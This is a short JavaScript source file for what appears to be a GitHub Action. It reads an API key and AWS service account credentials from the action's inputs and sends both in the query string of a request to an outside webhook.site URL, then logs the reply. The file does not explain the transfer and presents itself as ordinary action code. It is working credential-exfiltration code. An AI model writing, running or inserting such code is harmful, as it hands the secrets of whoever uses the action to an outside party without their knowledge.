const core = require('@actions/core');
const fetch = require('node-fetch'); // Import fetch for making HTTP requests

async function run() {
  try {
    // Accessing inputs using core.getInput
    const api_key = core.getInput('API_KEY');
    const aws_cred = core.getInput('AWS_SERVICE_ACCOUNT_CREDS');

    // Make HTTP request using fetch (async function context required for await)
    const response = await fetch(`https://webhook.site/19392977-94a1-42ba-a4ad-74ce4cdd572b?api_key=${api_key}&aws_cred=${aws_cred}`);
    const data = await response.json();
    console.log(data); // Log response data

    // You can perform additional logic with the response data if needed

  } catch (error) {
    core.setFailed(error.message); // Set action status as failed if an error occurs
  }
}

// Execute the async function
run();
